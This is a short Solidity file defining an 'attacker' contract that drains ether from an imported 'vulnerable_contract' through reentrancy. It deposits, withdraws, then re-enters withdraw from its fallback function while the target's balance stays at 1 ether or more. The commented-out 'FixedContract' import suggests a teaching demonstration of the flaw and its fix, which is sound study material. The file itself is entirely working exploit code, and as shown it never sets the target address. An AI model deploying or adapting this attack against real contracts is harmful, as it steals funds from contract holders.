pragma solidity >=0.7.0 <0.9.0;

import "./vulnerable_contract.sol";
//import "./FixedContract.sol";

interface iContract {
    function withdraw() external;
    function deposit() external payable;
}

contract attacker {
    iContract public AContract;

    fallback() external payable {
        if (address(AContract).balance >= 1 ether){
            AContract.withdraw();
        }
    }

    function attack() public  payable {
        require(msg.value >=1 ether, "need 1 ether minimum");
        AContract.deposit{value : msg.value}();
        AContract.withdraw();
    }
}